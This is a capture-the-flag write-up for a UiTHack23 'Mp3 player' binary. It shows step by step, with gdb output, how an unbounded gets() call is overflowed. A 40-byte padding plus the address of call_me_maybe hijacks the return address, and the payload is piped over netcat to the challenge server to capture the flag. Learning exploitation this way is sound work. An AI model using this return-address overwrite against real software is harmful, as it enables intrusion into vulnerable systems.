# Mp3 player

We found an old mp3 player laying around and decided to connect it to the internet for everyone to listen to its good ol' hits.
However, we might have messed up some of the instructions when setting it up...

You can connect to the Mp3 player with netcat

$ nc motherload.td.org.uit.no 8006

# Writeup

Quick reading of source seems to allow me to get lyrics of the songs i write the name of. `call_me_maybe` is the song I need to play but it is not in the list of available songs to play.

Quickly saw the "gets" which is deprecated in any way shape and form. Not to be used and also heavily used in CTF. This has no limit on how much input it reads. So even though there is only 30 characters given in the buffer if we write more it will pollute the stack.

So I start up: `gdb mp3_player`. Running the info functions command shows me that call me maybe is at `0x000000000040140f`

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010e0  putchar@plt
0x00000000004010f0  _exit@plt
0x0000000000401100  puts@plt
0x0000000000401110  fclose@plt
0x0000000000401120  fgetc@plt
0x0000000000401130  alarm@plt
0x0000000000401140  strcmp@plt
0x0000000000401150  signal@plt
0x0000000000401160  gets@plt
0x0000000000401170  setvbuf@plt
0x0000000000401180  fopen@plt
0x0000000000401190  _start
0x00000000004011c0  _dl_relocate_static_pie
0x00000000004011d0  deregister_tm_clones
0x0000000000401200  register_tm_clones
0x0000000000401240  __do_global_dtors_aux
0x0000000000401270  frame_dummy
0x0000000000401276  ignore_me
0x00000000004012db  timeout
0x0000000000401309  ignore_me_timeout
0x000000000040132f  menu
0x000000000040135e  photograph
0x0000000000401399  lose_yourself
0x00000000004013d4  mamma_mia
0x000000000040140f  call_me_maybe
0x0000000000401472  play_song
0x00000000004014fa  main
0x0000000000401550  __libc_csu_init
0x00000000004015c0  __libc_csu_fini
0x00000000004015c8  _fini
```

I was a bit blind but after watching [Running a Buffer Overflow Attach - Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo) it became clear to me. I can change the return address in the stack. The return address is where the program should continue executing from after a function call has been run. So basically we can tell it where to go after it has executed `play_song()`.

After a bit of testing I managed to figure out what number I had to use to overwrite that return address. I knew it was over 30 as the buffer was 30. 

```
(gdb) run  < <(python -c 'print("A"*41)')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/toffe/Projects/uithack/mp3_player/mp3_player < <(python -c 'print("A"*41)')

[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to my online MP3 Player!

Please choose the name of the song you want to play:

- Photograph - Nickelback
- Lose Yourself - Eminem
- Mamma Mia - ABBA
Could not play the requested song

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7df0041 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
```

As it seems the magic number is 40. Everything after 40 is polluting the return address. As you see on the end of the return address it is now `0x00007ffff7df0041`, that last `41` is the hex for an uppercase A. So I just added manually letters.

```
(gdb) run  < <(python -c 'print("A"*40 + "ABCDEF")')
....
Program received signal SIGSEGV, Segmentation fault.
0x0000464544434241 in ?? ()
```

When I added another character now it seems to be something else happening. So the magic number is 6 letters to change the return address.

So by doing `run  < <(python -c 'print("A"*40 + "\x00\x00\x00\x00\x00\x00")')` I managed to set the return address to `0x0000000000000000`. Lets modify it to start at call me maybe: `0x000000000040140f`. As it is added backwards we need to add the digits backwards aswell. So the payload is:

```
(gdb) run  < <(python -c 'print("A"*40 + "\x0f\x14\x40\x00\x00\x00")')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/toffe/Projects/uithack/mp3_player/mp3_player < <(python -c 'print("A"*40 + "\x0f\x14\x40\x00\x00\x00")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to my online MP3 Player!

Please choose the name of the song you want to play:

- Photograph - Nickelback
- Lose Yourself - Eminem
- Mamma Mia - ABBA
Could not play the requested song
MY TEST FLAG
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdef0 in ?? ()
```

There we managed to read my test flag. Now we have a payload to send:

```
└─$ python -c 'print("A"*40 + "\x0f\x14\x40\x00\x00")' | nc motherload.td.org.uit.no 8006
Welcome to my online MP3 Player!

Please choose the name of the song you want to play:

- Photograph - Nickelback
- Lose Yourself - Eminem
- Mamma Mia - ABBA
Could not play the requested song
UiTHack23{H3r35_MY_4dDr355_50_caLL_M3_may83}
```

The flag is secured!